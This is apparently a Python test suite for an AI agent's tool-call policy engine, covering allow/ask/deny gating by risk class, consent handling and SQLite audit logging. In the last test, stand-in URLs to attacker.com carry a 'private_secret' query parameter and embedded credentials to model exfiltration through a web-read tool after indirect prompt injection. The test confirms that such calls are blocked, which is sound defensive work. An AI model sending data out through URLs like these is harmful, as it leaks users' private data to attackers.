"""P1-E tests: policy engine + audit log. Hermetic (in-memory SQLite, fake tools)."""

import asyncio
import sqlite3

import pytest

from kernel import EventBus, RiskClass, ToolCall, ToolRegistry
from kernel.policy import AuditLog, Decision, Policy, PolicyEngine


def stub_registry():
    """Real ToolRegistry with real Tools (handlers record execution)."""
    executed = []

    def make(name, risk):
        def handler(c):
            executed.append(name)
            return {"ran": name}
        from kernel.tools.base import Tool
        return Tool(name=name, description=f"{name} stub",
                    parameters={"type": "object", "properties": {}},
                    handler=handler, risk=risk)

    reg = ToolRegistry()
    for name, risk in [("read_file", RiskClass.READ), ("write_file", RiskClass.WRITE),
                       ("run_code", RiskClass.EXECUTE), ("delete_all", RiskClass.DESTRUCTIVE)]:
        reg.register(make(name, risk))
    return reg, executed


def call(name, **kw):
    return ToolCall(id=f"c-{name}-{abs(hash(kw.get('src'))) % 9999}", name=name,
                    args={}, source=kw.get("src", "test"))


# ---------------------------------------------------------------- policy rules

def test_01_default_policy_posture():
    p = Policy.default()
    assert p.decide(RiskClass.READ) is Decision.ALLOW
    assert p.decide(RiskClass.WRITE) is Decision.ASK
    assert p.decide(RiskClass.EXECUTE) is Decision.ASK
    assert p.decide(RiskClass.DESTRUCTIVE) is Decision.DENY


def test_02_policy_must_cover_all_risk_classes():
    with pytest.raises(ValueError, match="missing"):
        Policy(rules={RiskClass.READ: Decision.ALLOW})


def test_03_engine_default_is_safe():
    eng = PolicyEngine()  # no args → default policy, no audit
    assert eng.decide(RiskClass.READ) is Decision.ALLOW
    assert eng.decide(RiskClass.DESTRUCTIVE) is Decision.DENY


# ---------------------------------------------------------------- gating behavior

def test_04_read_tool_runs_without_consent():
    reg, executed = stub_registry()
    eng = PolicyEngine()
    res = asyncio.run(eng.run(call("read_file"), reg))
    assert res.ok is True and executed == ["read_file"]


def test_05_ask_with_no_consent_handler_denies_fail_safe():
    reg, executed = stub_registry()
    eng = PolicyEngine()
    res = asyncio.run(eng.run(call("write_file"), reg))
    assert res.ok is False and "consent" in res.error
    assert executed == []                       # nothing ran
    assert reg.get("write_file").risk is RiskClass.WRITE


def test_06_ask_yes_executes():
    reg, executed = stub_registry()
    eng = PolicyEngine()
    res = asyncio.run(eng.run(call("write_file"), reg, consent=lambda c, r: asyncio.sleep(0, True)))
    assert res.ok is True and executed == ["write_file"]


def test_07_ask_no_denies():
    reg, executed = stub_registry()
    eng = PolicyEngine()
    res = asyncio.run(eng.run(call("write_file"), reg, consent=lambda c, r: asyncio.sleep(0, False)))
    assert res.ok is False and "declined" in res.error
    assert executed == []


def test_08_consent_handler_crash_denies():
    reg, executed = stub_registry()
    eng = PolicyEngine()

    def broken(c, r):
        raise RuntimeError("UI exploded")

    res = asyncio.run(eng.run(call("write_file"), reg, consent=broken))
    assert res.ok is False and executed == []   # broken consent must not execute


def test_09_destructive_denied_even_with_consent():
    """DENY is absolute — no callback can override it."""
    reg, executed = stub_registry()
    eng = PolicyEngine()
    res = asyncio.run(eng.run(call("delete_all"), reg, consent=lambda c, r: asyncio.sleep(0, True)))
    assert res.ok is False and "denied by policy" in res.error
    assert executed == []


def test_10_custom_policy_can_flip_decisions():
    reg, executed = stub_registry()
    policy = Policy(rules={RiskClass.READ: Decision.ALLOW,
                           RiskClass.WRITE: Decision.ALLOW,
                           RiskClass.EXECUTE: Decision.DENY,
                           RiskClass.DESTRUCTIVE: Decision.DENY})
    eng = PolicyEngine(policy=policy)
    assert asyncio.run(eng.run(call("write_file"), reg)).ok is True
    res = asyncio.run(eng.run(call("run_code"), reg))
    assert res.ok is False and executed == ["write_file"]


def test_11_unknown_tool_passthrough_audited():
    reg, executed = stub_registry()
    audit = AuditLog()
    eng = PolicyEngine(audit=audit)
    res = asyncio.run(eng.run(call("ghost_tool"), reg))
    assert res.ok is False and "unknown tool" in res.error
    assert executed == []
    assert audit.recent(1)[0]["decision"] == "unknown"


# ---------------------------------------------------------------- audit log

def test_12_audit_records_allow_ask_and_deny():
    reg, _ = stub_registry()
    audit = AuditLog()
    eng = PolicyEngine(audit=audit)
    asyncio.run(eng.run(call("read_file"), reg))                                   # allow
    asyncio.run(eng.run(call("write_file"), reg))                                  # ask → deny (no consent)
    entries = audit.recent(10)
    decisions = [e["decision"] for e in entries][::-1]                             # oldest first
    assert decisions == ["allow", "denied"]
    assert entries[0]["name"] in ("read_file", "write_file")


def test_13_audit_entries_have_full_context():
    reg, _ = stub_registry()
    audit = AuditLog()
    eng = PolicyEngine(audit=audit)
    asyncio.run(eng.run(call("read_file", src="voice"), reg))
    e = audit.recent(1)[0]
    assert e["name"] == "read_file" and e["source"] == "voice"
    assert e["risk"] == "read" and e["decision"] == "allow" and e["ok"] == 1
    assert e["ts"] > 0 and e["call_id"]


def test_14_audit_log_persists_to_sqlite_file(tmp_path):
    db = tmp_path / "audit.db"
    reg, _ = stub_registry()
    eng = PolicyEngine(audit=AuditLog(db))
    asyncio.run(eng.run(call("read_file"), reg))

    fresh = sqlite3.connect(db)
    n = fresh.execute("SELECT COUNT(*) FROM audit").fetchone()[0]
    fresh.close()
    assert n == 1


def test_15_denied_publishes_policy_event():
    reg, _ = stub_registry()
    bus = EventBus()
    seen = []
    bus.subscribe("policy.*", lambda e: seen.append(e.type))
    eng = PolicyEngine()
    asyncio.run(eng.run(call("delete_all"), reg, bus=bus))
    assert seen == ["policy.denied"]


def test_16_web_read_with_query_params_elevates_to_write_and_requires_consent():
    """REV-02: prevent silent indirect prompt injection data exfiltration via web_read."""
    from kernel.tools.base import Tool
    reg, executed = stub_registry()
    def handler(c):
        executed.append("web_read")
        return {"ran": "web_read"}

    reg.register(Tool(
        name="web_read", description="web read stub",
        parameters={"type": "object", "properties": {"url": {"type": "string"}}},
        handler=handler, risk=RiskClass.READ,
    ))
    eng = PolicyEngine()

    # Normal URL without query parameters remains READ -> ALLOW
    c_clean = ToolCall(id="c-clean", name="web_read", args={"url": "https://example.com/article"})
    res_clean = asyncio.run(eng.run(c_clean, reg))
    assert res_clean.ok is True and "web_read" in executed

    # URL with query parameters elevates to WRITE -> ASK (DENY when no consent callback)
    c_leak = ToolCall(id="c-leak", name="web_read", args={"url": "https://attacker.com/leak?data=private_secret"})
    res_leak = asyncio.run(eng.run(c_leak, reg))
    assert res_leak.ok is False
    assert "requires consent" in (res_leak.error or "")
    assert res_leak.risk is RiskClass.WRITE

    # URL with embedded credentials elevates to WRITE -> ASK (DENY when no consent callback)
    c_cred = ToolCall(id="c-cred", name="web_read", args={"url": "https://secret_token@attacker.com/leak"})
    res_cred = asyncio.run(eng.run(c_cred, reg))
    assert res_cred.ok is False
    assert "requires consent" in (res_cred.error or "")
    assert res_cred.risk is RiskClass.WRITE
